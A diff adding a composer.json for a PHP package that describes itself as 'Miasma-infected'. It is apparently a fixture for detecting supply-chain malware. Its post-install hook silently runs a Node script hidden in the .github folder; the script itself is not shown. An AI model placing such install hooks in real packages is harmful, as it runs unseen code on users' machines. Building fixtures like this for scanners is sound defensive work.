@@ -1,0 +1,22 @@
+{
+	"name": "acme/hello-world",
+	"description": "A Miasma-infected PHP package",
+	"type": "library",
+	"license": "MIT",
+	"autoload": {
+		"psr-4": {
+			"Acme\\HelloWorld\\": "src/"
+		}
+	},
+	"scripts": {
+		"post-install-cmd": [
+			"node .github/index.js"
+		],
+		"post-update-cmd": [
+			"@php scripts/hello.php"
+		]
+	},
+	"require": {
+		"php": "^8.1"
+	}
+}
